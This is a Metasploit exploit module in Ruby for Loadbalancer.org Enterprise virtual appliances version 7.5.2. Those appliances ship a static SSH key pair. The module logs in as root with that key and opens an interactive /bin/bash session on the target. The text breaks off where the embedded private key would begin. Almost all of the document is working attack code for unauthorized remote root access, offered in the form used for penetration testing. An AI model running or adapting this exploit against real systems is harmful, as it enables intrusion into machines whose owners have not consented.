##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'net/ssh'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info, {
      'Name'        => 'Loadbalancer.org Enterprise VA SSH Private Key Exposure',
      'Description' => %q{
        Loadbalancer.org ships a public/private key pair on Enterprise virtual appliances
        version 7.5.2 that allows passwordless authentication to any other LB Enterprise box.
        Since the key is easily retrievable, an attacker can use it to gain unauthorized remote
        access as root.
      },
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Privileged'  => true,
      'Targets'     => [ [ "Universal", {} ] ],
      'Payload'     =>
        {
          'Compat'  => {
            'PayloadType'    => 'cmd_interact',
            'ConnectionType' => 'find',
          },
        },
      'Author'      => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['URL', 'http://packetstormsecurity.com/files/125754/Loadbalancer.org-Enterprise-VA-7.5.2-Static-SSH-Key.html']
        ],
      'DisclosureDate' => "Mar 17 2014",
      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },
      'DefaultTarget' => 0
    }))

    register_options(
      [
        # Since we don't include Tcp, we have to register this manually
        Opt::RHOST(),
        Opt::RPORT(22)
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )

  end

  # helper methods that normally come from Tcp
  def rhost
    datastore['RHOST']
  end
  def rport
    datastore['RPORT']
  end

  def do_login(user)
    opt_hash = {
      :auth_methods => ['publickey'],
      :msframework  => framework,
      :msfmodule    => self,
      :port         => rport,
      :key_data     => [ key_data ],
      :disable_agent => true,
      :config => false,
      :record_auth_info => true,
      :proxies => datastore['Proxies']
    }
    opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
    begin
      ssh_socket = nil
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        ssh_socket = Net::SSH.start(rhost, user, opt_hash)
      end
    rescue Rex::ConnectionError, Rex::AddressInUse
      return nil
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
      return nil
    rescue ::Timeout::Error
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return nil
    rescue Net::SSH::AuthenticationFailed
      print_error "#{rhost}:#{rport} SSH - Failed authentication"
      return nil
    rescue Net::SSH::Exception => e
      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
      return nil
    end

    if ssh_socket

      # Create a new session from the socket, then dump it.
      conn = Net::SSH::CommandStream.new(ssh_socket, '/bin/bash', true)
      ssh_socket = nil

      return conn
    else
      return nil
    end
  end

  def exploit
    conn = do_login("root")
    if conn
      print_good "#{rhost}:#{rport} - Successful login"
      handler(conn.lsock)
    end
  end

  def key_data
    <<EOF
